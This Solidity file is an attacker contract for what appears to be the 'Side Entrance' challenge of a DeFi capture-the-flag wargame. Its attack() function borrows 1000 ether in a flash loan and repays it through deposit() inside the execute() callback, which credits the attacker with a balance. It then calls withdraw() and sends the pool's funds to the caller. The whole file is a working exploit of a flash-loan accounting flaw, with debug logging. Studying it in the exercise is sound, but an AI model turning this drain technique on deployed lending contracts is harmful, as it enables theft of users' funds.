// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool private pool;

    constructor(address _poolAddress) {
        pool = SideEntranceLenderPool(_poolAddress);
    }

    function attack() external {
        console.log("e0 msg.sender: ", msg.sender);
        pool.flashLoan(1000 ether);
        console.log("e3 address(this).balance: ", address(this).balance);
        pool.withdraw();
        console.log("e4 address(this).balance: ", address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    // execute同样为payable属性
    function execute() external payable {
        console.log("e1 address(this): ", address(this));
        console.log("e1 msg.sender: ", msg.sender);
        // 发送1000 ether到vicitm合约
        pool.deposit{ value: 1000 ether }();
    }

    receive() external payable {}
}
